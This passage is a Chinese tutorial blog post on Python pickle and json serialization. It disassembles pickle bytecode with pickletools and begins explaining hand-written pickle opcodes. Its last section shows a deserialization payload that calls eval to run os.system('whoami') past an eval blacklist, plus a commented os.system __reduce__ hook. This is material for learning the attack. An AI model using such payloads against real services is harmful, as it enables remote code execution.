class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = Person(&#x27;张三&#x27; , 30 , False)</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">pp = pickle.dumps(p)</span><br><span class=\"line\">type(pp)   #&lt;class &#x27;bytes&#x27;&gt;</span><br><span class=\"line\">print(pp)  </span><br><span class=\"line\">#b&#x27;\\x80\\x03c__main__\\nPerson\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x06\\x00\\x00\\x00\\xe5\\xbc\\xa0\\xe4\\xb8\\x89q\\x04X\\x03\\x00\\x00\\x00ageq\\x05K\\x1eX\\t\\x00\\x00\\x00isMarriedq\\x06\\x89ub.&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p2 = pickle.loads(pp)</span><br><span class=\"line\">type(p2)  #&lt;class &#x27;__main__.Person&#x27;&gt;</span><br><span class=\"line\">p2.name   #&#x27;张三&#x27;</span><br></pre></td></tr></table></figure>\n<p>甚至 pickle 模块还能够对 Peron 本身进行序列化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">per = pickle.dumps(Person)</span><br><span class=\"line\">print(per)   #b&#x27;\\x80\\x03c__main__\\nPerson\\nq\\x00.&#x27;</span><br><span class=\"line\">per2 = pickle.loads(per)</span><br><span class=\"line\">print(per2)   #&lt;class &#x27;__main__.Person&#x27;&gt;</span><br></pre></td></tr></table></figure>\n<p>如果用 json 对 Person 实例对象进行序列化，就会报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import json</span><br><span class=\"line\">p = Person(&#x27;张三&#x27; , 30 , False)</span><br><span class=\"line\">json.dumps(p)</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">File &quot;&lt;pyshell#49&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class=\"line\">json.dumps(p)</span><br><span class=\"line\">……</span><br><span class=\"line\">TypeError: Object of type &#x27;Person&#x27; is not JSON serializable</span><br></pre></td></tr></table></figure>\n<p><strong>如果非要用 json 对 Person 对象进行序列化，必须先定义一个将 Person 对象转化为字典（dict) 的方法</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def person2dict(per):</span><br><span class=\"line\">    return &#123;</span><br><span class=\"line\">    &#x27;name&#x27;:per.name ,</span><br><span class=\"line\">    &#x27;age&#x27;:per.age ,</span><br><span class=\"line\">    &#x27;isMarried&#x27;:per.isMarried</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">p3 = json.dumps(p , default=person2dict)</span><br><span class=\"line\">type(p3)    #&lt;class &#x27;str&#x27;&gt;</span><br><span class=\"line\">print(p3)   # &#x27;&#123;&quot;name&quot;: &quot;\\\\u5f20\\\\u4e09&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p3 = json.dumps(p , default=person2dict , ensure_ascii=False)</span><br><span class=\"line\">type(p3)   #&lt;class &#x27;str&#x27;&gt;</span><br><span class=\"line\">print(p3)  # &#x27;&#123;&quot;name&quot;: &quot;张三&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;&#x27;</span><br></pre></td></tr></table></figure>\n<p>当然，也不能直接进行反序列化，不然也只会得到一个字典：</p>\n<p>此时，也要定义一个将字典转换为 Person 类实例的方法，在进行反序列化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def dict2person(d):</span><br><span class=\"line\">\treturn Person(d[&#x27;name&#x27;],d[&#x27;age&#x27;],d[&#x27;isMarried&#x27;])</span><br><span class=\"line\">p5 = json.loads(p3 , object_hook=dict2person)</span><br><span class=\"line\">type(p5)         #&lt;class &#x27;__main__.Person&#x27;&gt;</span><br><span class=\"line\">print(p5.name)   #&#x27;张三&#x27;</span><br></pre></td></tr></table></figure>\n<p><strong>（2）pickle 序列化结果为 bites 类型，只适合于 Python 机器之间的交互。</strong></p>\n<p><strong>json 序列化结果为 str 类型，能够被多种语言识别，可用于与其他程序设计语言交互。</strong></p>\n<p><strong>JSON 和 Python 内置的数据类型对应如下：</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">JSON 类型</th>\n<th style=\"text-align:left\">Python 类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">{}</td>\n<td style=\"text-align:left\">dict</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[]</td>\n<td style=\"text-align:left\">list</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">“string”</td>\n<td style=\"text-align:left\">‘str’或 u’unicode’</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">1234.56</td>\n<td style=\"text-align:left\">int 或 float</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">true/false</td>\n<td style=\"text-align:left\">True/False</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">null</td>\n<td style=\"text-align:left\">None</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p><strong>（1）序列化与反序列化是为了解决内存中对象的持久化与传输问题；</strong></p>\n<p><strong>（2）Python 中提供了 pickle 和 json 两个模块进行序列化与反序列化；</strong></p>\n<p><strong>（3）dumps () 和 dump () 用于序列化，loads () 和 load () 用于反序列化；</strong></p>\n<p><strong>（4）pickle 模块能序列化任何对象，序列化结果为 bites 类型，只适合于 Python 机器之间交互；</strong></p>\n<p><strong>json 模块只能序列化 Python 基本类型，序列化结果为 json 格式字符串，适合不同开发语言之间交互。</strong></p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTc1Njgx\">https://cloud.tencent.com/developer/article/1575681</span></p>\n<h3 id=\"反序列化流程分析\"><a class=\"markdownIt-Anchor\" href=\"#反序列化流程分析\">#</a> 反序列化流程分析</h3>\n<p>直接分析反序列化出的字符串是比较困难的，我们可以使用 <code>pickletools</code>  帮助我们进行分析</p>\n<p>pickletools 是 python 自带的 pickle 调试器，有三个功能：<strong>反汇编</strong>一个已经被打包的字符串、<strong>优化</strong>一个已经被打包的字符串、返回一个迭代器来供程序使用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickletools</span><br><span class=\"line\">import pickle</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">a_list = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">a_list_pickle = pickle.dumps(a_list,protocol=0)</span><br><span class=\"line\">print(a_list_pickle)</span><br><span class=\"line\">print(&#x27;------------------&#x27;)</span><br><span class=\"line\"># 优化一个已经被打包的字符串</span><br><span class=\"line\">a_list_pickle = pickletools.optimize(a_list_pickle)</span><br><span class=\"line\">print(a_list_pickle)</span><br><span class=\"line\">print(&#x27;------------------&#x27;)</span><br><span class=\"line\"># 反汇编一个已经被打包的字符串</span><br><span class=\"line\">pickletools.dis(a_list_pickle)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;(lp0\\nVa\\np1\\naVb\\np2\\naVc\\np3\\na.&#x27;</span><br><span class=\"line\">------------------</span><br><span class=\"line\">b&#x27;(lVa\\naVb\\naVc\\na.&#x27;</span><br><span class=\"line\">------------------</span><br><span class=\"line\">    0: (    MARK</span><br><span class=\"line\">    1: l        LIST       (MARK at 0)</span><br><span class=\"line\">    2: V    UNICODE    &#x27;a&#x27;</span><br><span class=\"line\">    5: a    APPEND</span><br><span class=\"line\">    6: V    UNICODE    &#x27;b&#x27;</span><br><span class=\"line\">    9: a    APPEND</span><br><span class=\"line\">   10: V    UNICODE    &#x27;c&#x27;</span><br><span class=\"line\">   13: a    APPEND</span><br><span class=\"line\">   14: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>\n<p>pickletools 指令集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MARK           = b&#x27;(&#x27;   # push special markobject on stack</span><br><span class=\"line\">STOP           = b&#x27;.&#x27;   # every pickle ends with STOP</span><br><span class=\"line\">POP            = b&#x27;0&#x27;   # discard topmost stack item</span><br><span class=\"line\">POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject</span><br><span class=\"line\">DUP            = b&#x27;2&#x27;   # duplicate top stack item</span><br><span class=\"line\">FLOAT          = b&#x27;F&#x27;   # push float object; decimal string argument</span><br><span class=\"line\">INT            = b&#x27;I&#x27;   # push integer or bool; decimal string argument</span><br><span class=\"line\">BININT         = b&#x27;J&#x27;   # push four-byte signed int</span><br><span class=\"line\">BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int</span><br><span class=\"line\">LONG           = b&#x27;L&#x27;   # push long; decimal string argument</span><br><span class=\"line\">BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int</span><br><span class=\"line\">NONE           = b&#x27;N&#x27;   # push None</span><br><span class=\"line\">PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg</span><br><span class=\"line\">BINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br><span class=\"line\">REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack</span><br><span class=\"line\">STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument</span><br><span class=\"line\">BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument</span><br><span class=\"line\">SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br><span class=\"line\">UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument</span><br><span class=\"line\">BINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br><span class=\"line\">APPEND         = b&#x27;a&#x27;   # append stack top to list below it</span><br><span class=\"line\">BUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()</span><br><span class=\"line\">GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string args</span><br><span class=\"line\">DICT           = b&#x27;d&#x27;   # build a dict from stack items</span><br><span class=\"line\">EMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dict</span><br><span class=\"line\">APPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack slice</span><br><span class=\"line\">GET            = b&#x27;g&#x27;   # push item from memo on stack; index is string arg</span><br><span class=\"line\">BINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br><span class=\"line\">INST           = b&#x27;i&#x27;   # build &amp; push class instance</span><br><span class=\"line\">LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg</span><br><span class=\"line\">LIST           = b&#x27;l&#x27;   # build list from topmost stack items</span><br><span class=\"line\">EMPTY_LIST     = b&#x27;]&#x27;   # push empty list</span><br><span class=\"line\">OBJ            = b&#x27;o&#x27;   # build &amp; push class instance</span><br><span class=\"line\">PUT            = b&#x27;p&#x27;   # store stack top in memo; index is string arg</span><br><span class=\"line\">BINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br><span class=\"line\">LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br><span class=\"line\">SETITEM        = b&#x27;s&#x27;   # add key+value pair to dict</span><br><span class=\"line\">TUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack items</span><br><span class=\"line\">EMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tuple</span><br><span class=\"line\">SETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairs</span><br><span class=\"line\">BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding</span><br><span class=\"line\">TRUE           = b&#x27;I01\\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class=\"line\">FALSE          = b&#x27;I00\\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br></pre></td></tr></table></figure>\n<p>将上面的输出对照翻译</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03](X\\x01\\x00\\x00\\x00aX\\x01\\x00\\x00\\x00bX\\x01\\x00\\x00\\x00ce.&#x27;</span><br><span class=\"line\">    0: \\x80 PROTO      3\t#标明使用协议版本</span><br><span class=\"line\">    2: ]    EMPTY_LIST\t#将空列表压入栈</span><br><span class=\"line\">    3: (    MARK\t#将标志压入栈</span><br><span class=\"line\">    4: X        BINUNICODE &#x27;a&#x27;\t#unicode字符</span><br><span class=\"line\">   10: X        BINUNICODE &#x27;b&#x27;</span><br><span class=\"line\">   16: X        BINUNICODE &#x27;c&#x27;</span><br><span class=\"line\">   22: e        APPENDS    (MARK at 3)\t#将3号标志后的数据压入列表</span><br><span class=\"line\">   # 弹出栈中的数据，结束流程</span><br><span class=\"line\">   23: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>\n<p>我们再来看另一个更复杂的例子</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">class a_class():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.age = 114514</span><br><span class=\"line\">        self.name = &quot;QAQ&quot;</span><br><span class=\"line\">        self.list = [&quot;1919&quot;,&quot;810&quot;,&quot;qwq&quot;]</span><br><span class=\"line\">a_class_new = a_class()</span><br><span class=\"line\">a_class_pickle = pickle.dumps(a_class_new,protocol=3)</span><br><span class=\"line\">print(a_class_pickle)</span><br><span class=\"line\"># 优化一个已经被打包的字符串</span><br><span class=\"line\">a_list_pickle = pickletools.optimize(a_class_pickle)</span><br><span class=\"line\">print(a_class_pickle)</span><br><span class=\"line\"># 反汇编一个已经被打包的字符串</span><br><span class=\"line\">pickletools.dis(a_class_pickle)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\na_class\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x03\\x00\\x00\\x00ageq\\x03JR\\xbf\\x01\\x00X\\x04\\x00\\x00\\x00nameq\\x04X\\x03\\x00\\x00\\x00QAQq\\x05X\\x04\\x00\\x00\\x00listq\\x06]q\\x07(X\\x04\\x00\\x00\\x001919q\\x08X\\x03\\x00\\x00\\x00810q\\tX\\x03\\x00\\x00\\x00qwqq\\neub.&#x27;</span><br><span class=\"line\">b&#x27;\\x80\\x03c__main__\\na_class\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x03\\x00\\x00\\x00ageq\\x03JR\\xbf\\x01\\x00X\\x04\\x00\\x00\\x00nameq\\x04X\\x03\\x00\\x00\\x00QAQq\\x05X\\x04\\x00\\x00\\x00listq\\x06]q\\x07(X\\x04\\x00\\x00\\x001919q\\x08X\\x03\\x00\\x00\\x00810q\\tX\\x03\\x00\\x00\\x00qwqq\\neub.&#x27;</span><br><span class=\"line\">    0: \\x80 PROTO      3</span><br><span class=\"line\">    # push self.find_class(modname, name); 连续读取两个字符串作为参数，以\\n为界</span><br><span class=\"line\">    # 这里就是self.find_class(‘__main__’, ‘a_class’);</span><br><span class=\"line\">    # 需要注意的版本不同，find_class函数也不同</span><br><span class=\"line\">    2: c    GLOBAL     &#x27;__main__ a_class&#x27;\t</span><br><span class=\"line\">    # 不影响反序列化</span><br><span class=\"line\">   20: q    BINPUT     0</span><br><span class=\"line\">   # 向栈中压入一个元组</span><br><span class=\"line\">   22: )    EMPTY_TUPLE</span><br><span class=\"line\">   # 见pickletools源码第2097行（注意版本）</span><br><span class=\"line\">   # 大意为，该指令之前的栈内容应该为一个类（2行GLOBAL创建的类），类后为一个元组（22行压入的TUPLE），调用cls.__new__(cls, *args)（即用元组中的参数创建一个实例，这里元组实际为空）</span><br><span class=\"line\">   23: \\x81 NEWOBJ</span><br><span class=\"line\">   24: q    BINPUT     1</span><br><span class=\"line\">   # 压入一个新的字典</span><br><span class=\"line\">   26: &#125;    EMPTY_DICT</span><br><span class=\"line\">   27: q    BINPUT     2</span><br><span class=\"line\">   # 一个标志</span><br><span class=\"line\">   29: (    MARK</span><br><span class=\"line\">   # 压入unicode值</span><br><span class=\"line\">   30: X        BINUNICODE &#x27;age&#x27;</span><br><span class=\"line\">   38: q        BINPUT     3</span><br><span class=\"line\">   40: J        BININT     114514</span><br><span class=\"line\">   45: X        BINUNICODE &#x27;name&#x27;</span><br><span class=\"line\">   54: q        BINPUT     4</span><br><span class=\"line\">   56: X        BINUNICODE &#x27;QAQ&#x27;</span><br><span class=\"line\">   64: q        BINPUT     5</span><br><span class=\"line\">   66: X        BINUNICODE &#x27;list&#x27;</span><br><span class=\"line\">   75: q        BINPUT     6</span><br><span class=\"line\">   77: ]        EMPTY_LIST</span><br><span class=\"line\">   78: q        BINPUT     7</span><br><span class=\"line\">   # 又一个标志</span><br><span class=\"line\">   80: (        MARK</span><br><span class=\"line\">   81: X            BINUNICODE &#x27;1919&#x27;</span><br><span class=\"line\">   90: q            BINPUT     8</span><br><span class=\"line\">   92: X            BINUNICODE &#x27;810&#x27;</span><br><span class=\"line\">  100: q            BINPUT     9</span><br><span class=\"line\">  102: X            BINUNICODE &#x27;qwq&#x27;</span><br><span class=\"line\">  110: q            BINPUT     10</span><br><span class=\"line\">  # 将第80行的mark之后的值压入第77行的列表</span><br><span class=\"line\">  112: e            APPENDS    (MARK at 80)</span><br><span class=\"line\">  # 详情见pickletools源码第1674行（注意版本）</span><br><span class=\"line\">  # 大意为将任意数量的键值对添加到现有字典中</span><br><span class=\"line\">  # Stack before:  ... pydict markobject key_1 value_1 ... key_n value_n</span><br><span class=\"line\">  # Stack after:   ... pydict</span><br><span class=\"line\">  113: u        SETITEMS   (MARK at 29)</span><br><span class=\"line\">  # 通过__setstate__或更新__dict__完成构建对象（对象为我们在23行创建的）。</span><br><span class=\"line\">  # 如果对象具有__setstate__方法，则调用anyobject .__setstate__（参数）</span><br><span class=\"line\">  # 如果无__setstate__方法，则通过anyobject.__dict__.update(argument)更新值</span><br><span class=\"line\">  # 注意这里可能会产生变量覆盖</span><br><span class=\"line\">  114: b    BUILD</span><br><span class=\"line\">  # 弹出栈中的数据，结束流程</span><br><span class=\"line\">  115: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>\n<h3 id=\"手写opcode\"><a class=\"markdownIt-Anchor\" href=\"#手写opcode\">#</a> 手写 opcode</h3>\n<p>假设我们想执行如下命令，在内建函数中引用形式如下，如果有一个黑名单禁用 <code>eval</code> ，那么利用 <code>__reduce__</code> 就不能使用了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">builtins.getattr(builtins, &#x27;eval&#x27;),(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;,)</span><br></pre></td></tr></table></figure>\n<p>但是在 <code>__reduce__</code> 生成的序列化字符串，只能执行一个函数，而且在对 open 传参的过程中，程序会报错。</p>\n<p>不能正常生成序列化字符串，这就需要手写一个序列化字符串。</p>\n<p>一些常见的 code</p>\n<blockquote>\n<ul>\n<li><code>c</code> ：以 c 开始的后面两行的作用类似 <code>os.system</code>  的调用，其中 <code>cos</code>  在第一行， <code>system</code>  在第二行。</li>\n<li><code>(</code> ：相当于左括号</li>\n<li><code>t</code> ：相当于右括号</li>\n<li><code>S</code> ：表示本行的内容一个字符串</li>\n<li><code>R</code> ：执行紧靠自己左边的一个括号对（即 <code>(</code>  和 <code>t</code>  之间）的内容</li>\n<li><code>.</code> ：代表该 pickle 结束</li>\n</ul>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">class Student():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.name = &#x27;secret.name&#x27;</span><br><span class=\"line\">        self.grade = &#x27;secret.grade&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # def __reduce__(self):</span><br><span class=\"line\">    #     return (os.system,(&#x27;dir&#x27;,))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = pickle.dumps(Student(),protocol=0)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br><span class=\"line\">payload = pickletools.optimize(payload)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br><span class=\"line\">pickletools.dis(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nStudent\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVname\\np6\\nVsecret.name\\np7\\nsVgrade\\np8\\nVsecret.grade\\np9\\nsb.&#x27;</span><br><span class=\"line\">--------------</span><br><span class=\"line\">b&#x27;ccopy_reg\\n_reconstructor\\n(c__main__\\nStudent\\nc__builtin__\\nobject\\nNtR(dVname\\nVsecret.name\\nsVgrade\\nVsecret.grade\\nsb.&#x27;</span><br><span class=\"line\">--------------</span><br><span class=\"line\">    0: c    GLOBAL     &#x27;copy_reg _reconstructor&#x27;</span><br><span class=\"line\">   25: (    MARK</span><br><span class=\"line\">   26: c        GLOBAL     &#x27;__main__ Student&#x27;</span><br><span class=\"line\">   44: c        GLOBAL     &#x27;__builtin__ object&#x27;</span><br><span class=\"line\">   64: N        NONE</span><br><span class=\"line\">   65: t        TUPLE      (MARK at 25)</span><br><span class=\"line\">   66: R    REDUCE</span><br><span class=\"line\">   67: (    MARK</span><br><span class=\"line\">   68: d        DICT       (MARK at 67)</span><br><span class=\"line\">   69: V    UNICODE    &#x27;name&#x27;</span><br><span class=\"line\">   75: V    UNICODE    